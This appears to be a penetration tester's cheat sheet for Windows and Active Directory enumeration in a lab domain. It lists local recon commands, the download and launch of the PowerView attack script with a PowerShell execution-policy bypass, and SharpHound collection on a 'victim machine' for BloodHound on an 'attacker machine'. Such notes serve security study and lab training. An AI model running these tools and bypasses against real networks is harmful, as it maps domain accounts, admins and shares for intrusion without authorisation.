**Initial enumeration**
SNMP community string
hostnames
domain name
System
network
passwords
AV

**AD Enumeration**
Users & Admins
SPN
GPO
AD ACLs
Domain Trust

![Description](./Screenshots/screenshot.png)


**Basics**
systeminfo
hostname
whoami
echo %username%

**users / localgroups**
net users
net localgroups

**More info about a specific user. Check if user has privileges**
net user user1

**View Domain Groups**
net group /domain

**View Members of Domain Group**
net group /domain <Group Name>

**Firewall**
netsh firewall show state
netsh firewall show config

**Network**
ipconfig /all
route print
arp -A

**How well patched is the system**
wmic qfe get Caption,Description,HotFixID,InstalledOn
	
	
# PowerView

**download wget**
http://gnuwin32.sourceforge.net/packages/wget.htm

download powerview
wget https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

Open CMD bypassing execution policy
powershell -ep bypass

luanch PV
. .\powerview.ps1

Enumeration commands 
Get-NetDomain
Get-NetDomainController
Get-DomainPolicy
(Get-DomainPolicy)."system access"
Get-NetUser
Get-NetUser | select cn
Get-NetUser | select samaccountname
Get-NetUser | select description
Get-UserProperty
Get-UserProperty -Properties pwdlastset
Get-UserProperty -Properties logoncount
Get-UserProperty -Properties badpwdcount
Get-NetComputer -FullData
Get-NetComputer -FullData | select OperatingSystem
Get-NetGroup
Get-NetGroup -GroupName "Domain Admins"
Get-NetGroup -GroupName *admin*
Get-NetGroupMember -GroupName "Domain Admins"
Invoke-ShareFinder
Get-NetGPO
Get-NetGPO | select displayname, whenchanged


# Bloodhound

**Attacker machine**
apt install bloodhound
neo4j console


**Victim machine**
powershell .ep bypass

. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain MARVEL.local -ZipFileName file.zip